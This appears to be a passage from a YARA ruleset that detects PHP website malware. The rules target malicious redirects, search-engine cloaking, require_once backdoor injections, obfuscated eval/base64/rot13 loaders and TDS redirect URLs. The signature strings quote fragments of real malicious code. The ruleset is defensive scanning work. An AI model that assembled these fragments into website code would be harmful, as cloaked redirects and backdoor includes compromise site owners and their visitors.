        $ps0 = "\\x6d\\x61\\x67\\x69\\x63\\x2e\\x6a\\x70\\x67"
    condition:
        $ps0
}

rule php_malware_redirect_002 : malware
{
    strings:
        $trigger = "@include"
    condition:
        $trigger and PR05432
}

private rule PR05433 : trigger
{
    strings:
        $ps0 = "inject:function"
    condition:
        $ps0
}

rule php_malware_redirect_003 : malware
{
    strings:
        $trigger = ",show:function (){var"
    condition:
        $trigger and PR05433 and PR00641 and PR00669
}

private rule PR05434 : trigger
{
    strings:
        $ps0 = "if(strpos($url,'google')>0||"
    condition:
        $ps0
}

rule php_malware_redirect_005 : malware
{
    strings:
        $trigger = "echo \"<script>document.location='/';</script>"
    condition:
        $trigger and PR05434 and PR01401
}

private rule PR05435 : trigger
{
    strings:
        $ps0 = "<meta http-equiv=\"refresh\" content=\"0; url=<?php"
    condition:
        $ps0
}

rule php_malware_redirect_006 : malware
{
    strings:
        $trigger = "echo $rand_url;?> \">"
    condition:
        $trigger and PR05435
}

rule php_malware_redirect_007 : malware
{
    strings:
        $trigger = "$rand=$chars{rand(0, strlen($chars)-1)}.$chars{rand(0"
    condition:
        $trigger and PR00273 and PR01351
}

private rule PR05436 : trigger
{
    strings:
        $ps0 = "aIeew2ESSs9Kyf649N3AcXch1K3Z2QhsvO"
    condition:
        $ps0
}

rule php_malware_redirect_008 : malware
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR05436 and PR02538 and PR01422
}

rule php_malware_redirect_009 : malware
{
    strings:
        $trigger = "gethostbyaddr($_SERVER[\"REMOTE_ADDR\"]), \"google\"))"
    condition:
        $trigger and PR01401
}

private rule PR05437 : trigger
{
    strings:
        $ps0 = "google','msn','baidu"
    condition:
        $ps0
}

private rule PR05438 : trigger
{
    strings:
        $ps0 = "$_SERVER['HTTP_REFERER']"
    condition:
        $ps0
}

rule php_malware_redirect_010 : malware
{
    strings:
        $trigger = "strtolower($r);foreach ($words as $word)"
    condition:
        $trigger and PR05437 and PR05438
}

rule php_malware_redirect_011 : malware
{
    strings:
        $trigger = "<?php header('Location: '.$_GET["
    condition:
        $trigger
}

rule php_malware_redirect_012 : malware
{
    strings:
        $trigger = "aGVhZGVyKCJMb2NhdGlvbjo"
    condition:
        $trigger and PR01398
}

rule php_malware_redirect_013 : malware
{
    strings:
        $trigger = "$email = @base64_decode($email);"
    condition:
        $trigger and PR01746 and PR01490
}

private rule PR05439 : trigger
{
    strings:
        $ps0 = "$protocol = $resolve.\"?RefundStatus=APPROVED&id=\".$id;"
    condition:
        $ps0
}

rule php_malware_redirect_014 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR00050 and PR05439
}

rule php_malware_redirect_015 : malware
{
    strings:
        $trigger = "if ( get_current_user_id() !="
    condition:
        $trigger and PR00273
}

private rule PR05440 : trigger
{
    strings:
        $ps0 = "strpos($useragent,\"aol\")||strpos($useragent"
    condition:
        $ps0
}

rule php_malware_redirect_016 : malware
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR05440
}

rule php_malware_redirect_018 : malware
{
    strings:
        $trigger = "$URL = $urls[rand(0, count($urls) - 1)];"
    condition:
        $trigger and PR00538
}

rule php_malware_redirect_019 : malware
{
    strings:
        $trigger = "$fp = @fsockopen($site, $passwordxx);"
    condition:
        $trigger
}

rule php_malware_redirect_020 : malware
{
    strings:
        $trigger = "document.cookie = \"stuff=data\";"
    condition:
        $trigger and PR01490
}

private rule PR05441 : trigger
{
    strings:
        $ps0 = "echo 'document.location.href=unescape(\"'.rawurlencode("
    condition:
        $ps0
}

rule php_malware_redirect_021 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05441
}

rule php_malware_redirect_022 : malware
{
    strings:
        $trigger = "header(base64_decode('TG9jYXRpb246IGh0dHB"
    condition:
        $trigger
}

private rule PR05442 : trigger
{
    strings:
        $ps0 = "var where = document.referrer;"
    condition:
        $ps0
}

private rule PR05443 : trigger
{
    strings:
        $ps0 = "|google|"
    condition:
        $ps0
}

rule php_malware_redirect_023 : malware
{
    strings:
        $trigger = "hm = document.createElement(\"script\");"
    condition:
        $trigger and PR00664 and PR05442 and PR05443
}

private rule PR05444 : trigger
{
    strings:
        $ps0 = "@socket_create(AF_INET"
    condition:
        $ps0
}

private rule PR05445 : trigger
{
    strings:
        $ps0 = ".urlencode(strtolower($_SERVER["
    condition:
        $ps0
}

rule php_malware_redirect_025 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05444 and PR05445
}

// MANUAL FIX NECESSARY
rule php_malware_redirect_026 : malware
{
    strings:
        $trigger = "base64_decode"
        $php_malware_redirect_026_r0 = /\^[\s]*\$[\w]+\{\$[\w]+\};[\s]*return[\s]*\$[\w]+;[\s]*\};[\s]*eval\([\w]+\(base64_decode\(.[^\)]+\),/
    condition:
        $trigger and PR00029 and $php_malware_redirect_026_r0
}

private rule PR05446 : trigger
{
    strings:
        $ps0 = "$linka = $link.\"&\".$_SERVER['QUERY_STRING'].\"&xfsr=true\";"
    condition:
        $ps0
}

rule php_malware_redirect_027 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05446 and PR01428 and PR01021
}

// MANUAL FIX NECESSARY
rule php_malware_redirect_028 : malware
{
    strings:
        $trigger = "location"
        $php_malware_redirect_028_r0 = /function[\s]*[\w]+\(\)[\s]*\{[\s]*var[\s]*[\w]+[\s]*=[\s]*.location.;[\s]*var[\s]*[\w]+[\s]*=[\s]*.?document.?;[\s]*[\w]+\[[\w]+\][\s]*=[\s]*.<\?=[\s]*\$[\w]+[\s]*\?>.;[\s]*return[\s]*.[\w]+.;[\s]*\}/
    condition:
        $trigger and PR01480 and PR04201 and $php_malware_redirect_028_r0
}

private rule PR05447 : trigger
{
    strings:
        $ps0 = "http_build_query($_GET)"
    condition:
        $ps0
}

private rule PR05448 : trigger
{
    strings:
        $ps0 = ")){ echo file_get_contents('http"
    condition:
        $ps0
}

rule php_malware_redirect_029 : malware
{
    strings:
        $trigger = "header('Location: http"
    condition:
        $trigger and PR05447 and PR05448 and PR03964
}

// MANUAL FIX NECESSARY
private rule PR05449 : trigger
{
    strings:
        $ps0 = "header('Location: http"
    condition:
        $ps0
}

rule php_malware_redirect_030 : malware
{
    strings:
        $trigger = "fopen("
        $php_malware_redirect_030_r0 = /header\(.Location:[\s]+http[^;]+\);[\s]*\$[\w]+[\s]*=[\s]*fopen\([^;]+\);[\s]*fwrite\(\$[\w]+,[\s]*\$_SERVER\[.REMOTE_ADDR.\][^;]+\);[\s]*fclose\(\$[\w]+\);/
    condition:
        $trigger and PR01403 and PR03964 and PR05449 and $php_malware_redirect_030_r0
}

private rule PR05450 : trigger
{
    strings:
        $ps0 = "$ua = $_SERVER['HTTP_USER_AGENT'];"
    condition:
        $ps0
}

private rule PR05451 : trigger
{
    strings:
        $ps0 = "if (preg_match('/facebook/s"
    condition:
        $ps0
}

private rule PR05452 : trigger
{
    strings:
        $ps0 = "header('Location:"
    condition:
        $ps0
}

rule php_malware_redirect_031 : malware
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR05450 and PR05451 and PR05452
}

rule php_malware_redirect_032 : malware
{
    strings:
        $trigger = "preg_match(\"/^(?P<local>(?P<lang>[a-z]{1,8})([a-z0-9\\\\-_]+)?)/\", strtolower($_SERVER[\"HTTP_ACCEPT_LANGUAGE\"]),"
    condition:
        $trigger and PR00341 and PR00342
}

private rule PR05453 : trigger
{
    strings:
        $ps0 = "if(strpos($key,'baidu')!==false||strpos($key,'sogou')!==false"
    condition:
        $ps0
}

rule php_malware_redirect_034 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05453
}

private rule PR05454 : trigger
{
    strings:
        $ps0 = "explode(\"/\",$_GET["
    condition:
        $ps0
}

private rule PR05455 : trigger
{
    strings:
        $ps0 = "&& !strstr(strtolower(\\$_SERVER["
    condition:
        $ps0
}

rule php_malware_redirect_035 : malware
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR05454 and PR05455 and PR00070
}

private rule PR05456 : trigger
{
    strings:
        $ps0 = "header(\"Location: \"."
    condition:
        $ps0
}

private rule PR05457 : trigger
{
    strings:
        $ps0 = "google|bing|yandex|baidu|yahoo|duckduckgo|ask"
    condition:
        $ps0
}

rule php_malware_redirect_036 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05456 and PR05457
}

private rule PR05458 : trigger
{
    strings:
        $ps0 = "simplexml_load_file(\"http"
    condition:
        $ps0
}

rule php_malware_redirect_037 : malware
{
    strings:
        $trigger = ",\"a\");fwrite($"
    condition:
        $trigger and PR05458
}

private rule PR05459 : trigger
{
    strings:
        $ps0 = ".\":\" . $_SERVER['REQUEST_URI'] . \"->NoCity->NoState"
    condition:
        $ps0
}

rule php_malware_redirect_038 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01362 and PR05459
}

private rule PR05460 : trigger
{
    strings:
        $ps0 = "aHR0cH"
    condition:
        $ps0
}

rule php_malware_redirect_039 : malware
{
    strings:
        $trigger = "top.location"
    condition:
        $trigger and PR00050 and PR05460 and PR01079
}

private rule PR05461 : trigger
{
    strings:
        $ps0 = "hash('sha512',$link);"
    condition:
        $ps0
}

rule php_malware_redirect_040 : malware
{
    strings:
        $trigger = "unlink(__DIR__"
    condition:
        $trigger and PR05461 and PR01746 and PR01490
}

private rule PR05462 : trigger
{
    strings:
        $ps0 = "<body onload=\"document.form.submit()"
    condition:
        $ps0
}

private rule PR05463 : trigger
{
    strings:
        $ps0 = "elseif(filter_var($forward, FILTER_VALIDATE_IP))"
    condition:
        $ps0
}

private rule PR05464 : trigger
{
    strings:
        $ps0 = "@$_SERVER['HTTP_CLIENT_IP'];"
    condition:
        $ps0
}

rule php_malware_redirect_041 : malware
{
    strings:
        $trigger = "<title>Redirecting.."
    condition:
        $trigger and PR05462 and PR03964 and PR05463 and PR05464
}

private rule PR05465 : trigger
{
    strings:
        $ps0 = "pack('H*','20246a"
    condition:
        $ps0
}

rule php_malware_redirect_042 : malware
{
    strings:
        $trigger = "eval("
    condition:
        $trigger and PR05465
}

private rule PR05466 : trigger
{
    strings:
        $ps0 = "DOMContentLoaded|function|if|typeof|undefined|var|createElement|security|src|web|success|cloud|event|"
    condition:
        $ps0
}

rule php_malware_redirect_043 : malware
{
    strings:
        $trigger = "replace(new RegExp"
    condition:
        $trigger and PR00865 and PR05466 and PR00604
}

private rule PR05467 : trigger
{
    strings:
        $ps0 = "||var|xmlhttp||if|cookie|catch|vM|try|vDate|e|sCookieName|length|iT"
    condition:
        $ps0
}

rule php_malware_redirect_043_02 : malware
{
    strings:
        $trigger = "replace(new RegExp"
    condition:
        $trigger and PR05467 and PR00865 and PR00604
}

private rule PR05468 : trigger
{
    strings:
        $ps0 = ")) == \"http://\" || (mb_substr($"
    condition:
        $ps0
}

rule php_malware_redirect_044 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03580 and PR05468 and PR00431
}

private rule PR05469 : trigger
{
    strings:
        $ps0 = "$json = json_decode(hex2bin($file));"
    condition:
        $ps0
}

private rule PR05470 : trigger
{
    strings:
        $ps0 = "case (strpos($"
    condition:
        $ps0
}

rule php_malware_redirect_045 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05469 and PR05470
}

private rule PR05471 : trigger
{
    strings:
        $ps0 = "HTTP_ACCEPT_LANGUAGE"
    condition:
        $ps0
}

private rule PR05472 : trigger
{
    strings:
        $ps0 = "header(\"location: \" . $url);"
    condition:
        $ps0
}

rule php_malware_redirect_047 : malware
{
    strings:
        $trigger = "file_get_c"
    condition:
        $trigger and PR02163 and PR04033 and PR05471 and PR05472 and PR02492
}

private rule PR05473 : trigger
{
    strings:
        $ps0 = "$randomUrl = $addresses[$randomIndex];"
    condition:
        $ps0
}

private rule PR05474 : trigger
{
    strings:
        $ps0 = "eader('Location: "
    condition:
        $ps0
}

rule php_malware_redirect_048 : malware
{
    strings:
        $trigger = "$size = count($addresses);"
    condition:
        $trigger and PR05473 and PR05474
}

private rule PR05475 : trigger
{
    strings:
        $ps0 = "DQokaG9vayA9ICc8SWZNb2R1bGUgbW9kX3"
    condition:
        $ps0
}

rule php_malware_redirect_049 : malware
{
    strings:
        $trigger = "eval(base64_decode("
    condition:
        $trigger and PR05475 and PR00265
}

rule php_malware_redirect_050 : malware
{
    strings:
        $trigger = "pack('H*','202477"
    condition:
        $trigger and PR01550
}

private rule PR05476 : trigger
{
    strings:
        $ps0 = "#BOT-BUI#"
    condition:
        $ps0
}

rule php_malware_redirect_051 : malware
{
    strings:
        $trigger = "curl_exec"
    condition:
        $trigger and PR05476 and PR01362
}

// MANUAL FIX NECESSARY
rule php_malware_redirect_052 : malware
{
    strings:
        $trigger = "header (\"Location: http"
        $php_malware_redirect_052_r0 = /<.php\s*(\$\w+=\$_GET\[.\w+.\];\s*){1,2}header\s*.\"HTTP.\d.\d\s*\w+\s*\w+\"\);\s*header\s*..Location:\s*http[s|S]:..\w+[^;]*;\s*\?>/
    condition:
        $trigger and $php_malware_redirect_052_r0
}

// MANUAL FIX NECESSARY
private rule PR05477 : trigger
{
    strings:
        $ps0 = "@fwrite($"
    condition:
        $ps0
}

private rule PR05478 : trigger
{
    strings:
        $ps0 = "$banhosts = array("
    condition:
        $ps0
}

rule php_malware_redirect_053 : malware
{
    strings:
        $trigger = "file_get_contents"
        $php_malware_redirect_053_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR05477 and PR00431 and PR05478 and PR00357 and $php_malware_redirect_053_r0
}

// MANUAL FIX NECESSARY
rule php_malware_redirect_054 : malware
{
    strings:
        $trigger = "count($"
        $php_malware_redirect_054_r0 = /\$[\w]+[\s]*=[\s]*array\([\s]*.http[^;]+\);[\s]*\$[\w]+[\s]*=[\s]*count\(\$[\w]+\)[\s]*-[\s]*[\d]+;[\s]*\$[\w]+[\s]*=[\s]*rand/
    condition:
        $trigger and PR02741 and $php_malware_redirect_054_r0
}

private rule PR05479 : trigger
{
    strings:
        $ps0 = "pack('H*','657661"
    condition:
        $ps0
}

rule php_malware_redirect_055 : malware
{
    strings:
        $trigger = "eval("
    condition:
        $trigger and PR05479
}

private rule PR05480 : trigger
{
    strings:
        $ps0 = "@$_GET[\""
    condition:
        $ps0
}

private rule PR05481 : trigger
{
    strings:
        $ps0 = "<meta http-equiv='refresh' content='0;url=\""
    condition:
        $ps0
}

rule php_malware_redirect_056 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05480 and PR01479 and PR05481
}

private rule PR05482 : trigger
{
    strings:
        $ps0 = "top.location"
    condition:
        $ps0
}

rule php_malware_redirect_057 : malware
{
    strings:
        $trigger = "Z2V0YmVzdHByaXplL"
    condition:
        $trigger and PR00050 and PR01079 and PR05482
}

private rule PR05483 : trigger
{
    strings:
        $ps0 = "YmVzdHByaXplLmxpZ"
    condition:
        $ps0
}

rule php_malware_redirect_059 : malware
{
    strings:
        $trigger = "top.location"
    condition:
        $trigger and PR00050 and PR01079 and PR05483
}

private rule PR05484 : trigger
{
    strings:
        $ps0 = ".innerHTML = seconds;"
    condition:
        $ps0
}

rule php_malware_redirect_060 : malware
{
    strings:
        $trigger = ".style.display = \"none\";"
    condition:
        $trigger and PR00371 and PR00050 and PR05484
}

rule php_malware_redirect_061 : malware
{
    strings:
        $trigger = "(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110)"
    condition:
        $trigger
}

rule php_malware_redirect_063 : malware
{
    strings:
        $trigger = "echo '<script type=\"text/javascript\" src=\"'.chr(104).chr(116).chr(116).chr(112).chr(115)."
    condition:
        $trigger
}

private rule PR05485 : trigger
{
    strings:
        $ps0 = "if(!$url){"
    condition:
        $ps0
}

private rule PR05486 : trigger
{
    strings:
        $ps0 = "header(\"location:$url\");"
    condition:
        $ps0
}

rule php_malware_redirect_064 : malware
{
    strings:
        $trigger = "echo \"Please Enter Valid Url!\";"
    condition:
        $trigger and PR05485 and PR05486
}

private rule PR05487 : trigger
{
    strings:
        $ps0 = ")){header(base64_decode('SFRUUC"
    condition:
        $ps0
}

rule php_malware_redirect_065 : malware
{
    strings:
        $trigger = "PHNjcmlw"
    condition:
        $trigger and PR05487 and PR01877
}

private rule PR05488 : trigger
{
    strings:
        $ps0 = "echo(\"<script>window.location"
    condition:
        $ps0
}

rule php_malware_redirect_066 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05488 and PR01428
}

private rule PR05489 : trigger
{
    strings:
        $ps0 = "if(isset($_REQUEST[\"\\x68\\x74\\x61\\x63\\x63\\x65\\x73\\x73\"])){$"
    condition:
        $ps0
}

private rule PR05490 : trigger
{
    strings:
        $ps0 = ",CURLOPT_TIMEOUT,100);"
    condition:
        $ps0
}

private rule PR05491 : trigger
{
    strings:
        $ps0 = "0O0"
    condition:
        $ps0
}

rule php_malware_redirect_067 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05489 and PR05490 and PR05491
}

private rule PR05492 : trigger
{
    strings:
        $ps0 = "$html = file_get_contents($api_reqest->white_link.'?'.$_SERVER['QUERY_STRING']);"
    condition:
        $ps0
}

rule php_malware_redirect_068 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05492
}

private rule PR05493 : trigger
{
    strings:
        $ps0 = "header(\"Location: {$domainRedirect}{$flowUri}\");"
    condition:
        $ps0
}

private rule PR05494 : trigger
{
    strings:
        $ps0 = "file_put_contents($cacheFileName, $domainRedirect, LOCK_EX);"
    condition:
        $ps0
}

rule php_malware_redirect_068_02 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05493 and PR05494
}

rule php_malware_redirect_069 : malware
{
    strings:
        $trigger = ";if($_SERVER['SERVER_NAME']!=$"
    condition:
        $trigger and PR00273 and PR04149
}

rule php_malware_redirect_071 : malware
{
    strings:
        $trigger = "https://killbot.org"
    condition:
        $trigger
}

rule php_malware_redirect_071_02 : malware
{
    strings:
        $trigger = "Killbot"
    condition:
        $trigger
}

private rule PR05495 : trigger
{
    strings:
        $ps0 = ") && !replace_abc()){"
    condition:
        $ps0
}

rule php_malware_redirect_072 : malware
{
    strings:
        $trigger = "rand("
    condition:
        $trigger and PR00273 and PR05495
}

rule php_malware_redirect_073 : malware
{
    strings:
        $trigger = "(strpos($file->getFilename(),'.ph') == true)"
    condition:
        $trigger and PR00435 and PR03396
}

private rule PR05496 : trigger
{
    strings:
        $ps0 = "Googlebot')>0)"
    condition:
        $ps0
}

rule php_malware_redirect_074 : malware
{
    strings:
        $trigger = "HTTP_USER_AGENT"
    condition:
        $trigger and PR05496 and PR00273
}

rule php_malware_redirect_075 : malware
{
    strings:
        $trigger = "$file = fopen("
    condition:
        $trigger and PR02741 and PR01362 and PR04093
}

private rule PR05497 : trigger
{
    strings:
        $ps0 = "pack('H*','202470"
    condition:
        $ps0
}

rule php_malware_redirect_076 : malware
{
    strings:
        $trigger = "eval("
    condition:
        $trigger and PR05497
}

private rule PR05498 : trigger
{
    strings:
        $ps0 = ";}};x.onreadystatechange = function(r)"
    condition:
        $ps0
}

rule php_malware_redirect_077 : malware
{
    strings:
        $trigger = "document.getElementsByTagName(\"body\")[0].appendChild("
    condition:
        $trigger and PR05498
}

rule php_malware_redirect_078 : malware
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR01553 and PR01498 and PR01563
}

private rule PR05499 : trigger
{
    strings:
        $ps0 = "xRnbbttG9jk"
    condition:
        $ps0
}

rule php_malware_redirect_080 : malware
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR05499
}

private rule PR05500 : trigger
{
    strings:
        $ps0 = "{window.location.href"
    condition:
        $ps0
}

rule php_malware_redirect_081 : malware
{
    strings:
        $trigger = ",$useragent)||preg_match("
    condition:
        $trigger and PR00050 and PR05500
}

private rule PR05501 : trigger
{
    strings:
        $ps0 = ".open(\"GET\","
    condition:
        $ps0
}

private rule PR05502 : trigger
{
    strings:
        $ps0 = "http-equiv=\"refresh"
    condition:
        $ps0
}

rule php_malware_redirect_082 : malware
{
    strings:
        $trigger = "document.getElementsByTagName(\"body\")[0].appendChild("
    condition:
        $trigger and PR05501 and PR05502
}

private rule PR05503 : trigger
{
    strings:
        $ps0 = "foreach($_GET"
    condition:
        $ps0
}

rule php_malware_redirect_083 : malware
{
    strings:
        $trigger = ".$gourlparam."
    condition:
        $trigger and PR00371 and PR00050 and PR05503
}

rule php_malware_redirect_084 : malware
{
    strings:
        $trigger = "]) ? trim($_GET[\""
    condition:
        $trigger and PR01582 and PR01562 and PR04429 and PR04201
}

private rule PR05504 : trigger
{
    strings:
        $ps0 = "));__halt_compiler();NAMDEVEL.ID::"
    condition:
        $ps0
}

rule php_malware_redirect_085 : malware
{
    strings:
        $trigger = "\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65"
    condition:
        $trigger and PR01350 and PR05504
}

private rule PR05505 : trigger
{
    strings:
        $ps0 = "gethostbyaddr"
    condition:
        $ps0
}

rule php_malware_redirect_086 : malware
{
    strings:
        $trigger = ".urlencode($"
    condition:
        $trigger and PR05505 and PR01582 and PR00431 and PR01562 and PR04201
}

private rule PR05506 : trigger
{
    strings:
        $ps0 = "@chmod($tofile,0444);}if(isset($_REQUEST['test'])){exit('ok');}sleep(1)"
    condition:
        $ps0
}

rule php_malware_reinfect_001 : malware
{
    strings:
        $trigger = "if(@file_exists("
    condition:
        $trigger and PR05506
}

rule php_malware_require_image_002 : malware
{
    strings:
        $trigger = "require_once('favicon"
    condition:
        $trigger and PR03924
}

// MANUAL FIX NECESSARY
rule php_malware_require_onceinjection_004 : malware
{
    strings:
        $trigger = "equire_on"
        $php_malware_require_onceinjection_004_r0 = /if\(is_file\(['\"][\/\w+]+\/(img|images)\/\w+\.php['\"]\)\)\s*require_once\(['\"][\/\w+]+\/img\/\w+\.php[\"']\)/
    condition:
        $trigger and $php_malware_require_onceinjection_004_r0
}

// MANUAL FIX NECESSARY
private rule PR05507 : trigger
{
    strings:
        $ps0 = "require"
    condition:
        $ps0
}

rule php_malware_require_onceinjection_005 : malware
{
    strings:
        $trigger = "define"
        $php_malware_require_onceinjection_005_r0 = /require(_once)?\([^;]+wp-(includes|admin)[^;]+\);/
    condition:
        $trigger and PR05507 and PR01862 and PR01863 and $php_malware_require_onceinjection_005_r0
}

// MANUAL FIX NECESSARY
rule php_malware_require_onceinjection_006 : malware
{
    strings:
        $trigger = "equire"
        $php_malware_require_onceinjection_006_r0 = /\@require\(\s*.\s*wp-admin\/\d+\s*.\s*\)\s*;/
    condition:
        $trigger and $php_malware_require_onceinjection_006_r0
}

private rule PR05508 : trigger
{
    strings:
        $ps0 = "@require("
    condition:
        $ps0
}

rule php_malware_require_onceinjection_006_02 : malware
{
    strings:
        $trigger = "wp-config.php"
    condition:
        $trigger and PR05508
}

private rule PR05509 : trigger
{
    strings:
        $ps0 = "new KClickClient('http"
    condition:
        $ps0
}

private rule PR05510 : trigger
{
    strings:
        $ps0 = "require_once dirname(__FILE__) . '/wp-"
    condition:
        $ps0
}

rule php_malware_require_onceinjection_007 : malware
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR05509 and PR05510
}

// MANUAL FIX NECESSARY
rule php_malware_require_onceinjection_008 : malware
{
    strings:
        $trigger = "@require_once ($"
        $php_malware_require_onceinjection_008_r0 = /\$[\w]+[\s]*=[\s]*.\/home[^;]+;[\s]*if[\s]*\(file_exists\(\$[\w]+\)\)\{[\s]*\@require_once[\s]*\(\$[\w]+\);[\s]*\}/
    condition:
        $trigger and PR00203 and $php_malware_require_onceinjection_008_r0
}

private rule PR05511 : trigger
{
    strings:
        $ps0 = ")){@require_once("
    condition:
        $ps0
}

rule php_malware_require_onceinjection_009 : malware
{
    strings:
        $trigger = "*/$wp_content_handler);}/*"
    condition:
        $trigger and PR05511 and PR00203
}

private rule PR05512 : trigger
{
    strings:
        $ps0 = "&& is_file($f)) { require_once($f); die; }"
    condition:
        $ps0
}

rule php_malware_require_onceinjection_010 : malware
{
    strings:
        $trigger = "} catch (Exception $"
    condition:
        $trigger and PR05512 and PR00397 and PR01382
}

private rule PR05513 : trigger
{
    strings:
        $ps0 = "DUyNzg3J10pKXsNCiAgJGV"
    condition:
        $ps0
}

rule php_malware_require_onceinjection_011 : malware
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR05513
}

private rule PR05514 : trigger
{
    strings:
        $ps0 = ")) require_once $"
    condition:
        $ps0
}

rule php_malware_require_onceinjection_012 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05208 and PR05514
}

private rule PR05515 : trigger
{
    strings:
        $ps0 = "){return implode('',array_map(function($"
    condition:
        $ps0
}

rule php_malware_require_onceinjection_013 : malware
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR05515
}

private rule PR05516 : trigger
{
    strings:
        $ps0 = "= 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';"
    condition:
        $ps0
}

rule php_malware_require_onceinjection_014 : malware
{
    strings:
        $trigger = "require_once"
    condition:
        $trigger and PR05516
}

rule php_malware_require_onceinjection_015 : malware
{
    strings:
        $trigger = "if(stripos($_SERVER['REQUEST_URI'], '/sock/') !== false){ require_once(dirname(__FILE__).'/temp.php'); exit; }"
    condition:
        $trigger
}

rule php_malware_require_onceinjection_016 : malware
{
    strings:
        $trigger = "(is_file($f)) require_once "
    condition:
        $trigger
}

private rule PR05517 : trigger
{
    strings:
        $ps0 = "ReflectionFunction($_GET["
    condition:
        $ps0
}

rule php_malware_require_onceinjection_017 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05517
}

private rule PR05518 : trigger
{
    strings:
        $ps0 = "$resourceFilename = MAGENTO_ROOT"
    condition:
        $ps0
}

private rule PR05519 : trigger
{
    strings:
        $ps0 = "require_once $"
    condition:
        $ps0
}

rule php_malware_require_onceinjection_018 : malware
{
    strings:
        $trigger = "if (file_exists("
    condition:
        $trigger and PR05518 and PR05519
}

rule php_malware_require_onceinjection_019 : malware
{
    strings:
        $trigger = "_plugin = ABSPATH . \"\\x77\\x70\\x2d\\x"
    condition:
        $trigger and PR00203
}

// MANUAL FIX NECESSARY
private rule PR05520 : trigger
{
    strings:
        $ps0 = "file_get_contents(chr(104).chr(116).chr(116).chr(112)."
    condition:
        $ps0
}

rule php_malware_stats_injector_001 : malware
{
    strings:
        $trigger = "error_reporting(0);"
        $php_malware_stats_injector_001_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR05520 and $php_malware_stats_injector_001_r0
}

private rule PR05521 : trigger
{
    strings:
        $ps0 = "(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ?"
    condition:
        $ps0
}

rule php_malware_stats_injector_002 : malware
{
    strings:
        $trigger = ".chr"
    condition:
        $trigger and PR05521
}

private rule PR05522 : trigger
{
    strings:
        $ps0 = "=',\"\\110\\52\",\"!"
    condition:
        $ps0
}

rule php_malware_string_rearrangement_001 : malware
{
    strings:
        $trigger = "].$"
    condition:
        $trigger and PR05522
}

// MANUAL FIX NECESSARY
rule php_malware_string_rearrangement_003 : malware
{
    strings:
        $trigger = "file_get_contents"
        $php_malware_string_rearrangement_003_r0 = /file_get_contents\(\$file\);([\s]*\$[\w]+[\s]*=[\s]*str_replace\([^;]+\$[\w]+\);[\s]*)+file_put_contents\(\$[\w]+,[\s]*\$[\w]+\);/
    condition:
        $trigger and PR01468 and PR01444 and $php_malware_string_rearrangement_003_r0
}

private rule PR05523 : trigger
{
    strings:
        $ps0 = "// ?><?php"
    condition:
        $ps0
}

private rule PR05524 : trigger
{
    strings:
        $ps0 = "=strrev(str_ireplace(\""
    condition:
        $ps0
}

private rule PR05525 : trigger
{
    strings:
        $ps0 = "><?php //"
    condition:
        $ps0
}

rule php_malware_strrev_005 : malware
{
    strings:
        $trigger = "\";eval($"
    condition:
        $trigger and PR05523 and PR05524 and PR05525
}

rule php_malware_strrev_006 : malware
{
    strings:
        $trigger = "= str_rot13('n'.'f'.'f'.'r'.'e'.'g'"
    condition:
        $trigger
}

rule php_malware_strrev_007 : malware
{
    strings:
        $trigger = ");$wp_re_update=strrev(\"/wordpress"
    condition:
        $trigger and PR01837
}

private rule PR05526 : trigger
{
    strings:
        $ps0 = "et2ECY+1qlT99xhzbpvMcclsXa/lpd9yLGAqK7iLs"
    condition:
        $ps0
}

rule php_malware_strrev_008 : malware
{
    strings:
        $trigger = "x___"
    condition:
        $trigger and PR05526 and PR01490 and PR03877
}

private rule PR05527 : trigger
{
    strings:
        $ps0 = "str_rot13('=RDe1Za8XXAI1A9vlESqYAcHlB5FXFIqmeVI1"
    condition:
        $ps0
}

rule php_malware_strrev_009 : malware
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR05527 and PR00029
}

rule php_malware_su_redirect_001 : malware
{
    strings:
        $trigger = ".su/?tr="
    condition:
        $trigger and PR02764 and PR01788
}

rule php_malware_swfinjection_001 : malware
{
    strings:
        $trigger = "echo(base64_decode(\"PG9iamVjdCB0"
    condition:
        $trigger
}

private rule PR05528 : trigger
{
    strings:
        $ps0 = "/TDS.post.php?st="
    condition:
        $ps0
}

rule php_malware_tdsurl_001 : malware
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR05528
}

private rule PR05529 : trigger
{
    strings:
        $ps0 = "$esdid="
    condition:
        $ps0
}

private rule PR05530 : trigger
{
    strings:
        $ps0 = "/TDS.post.php"
    condition:
        $ps0
}

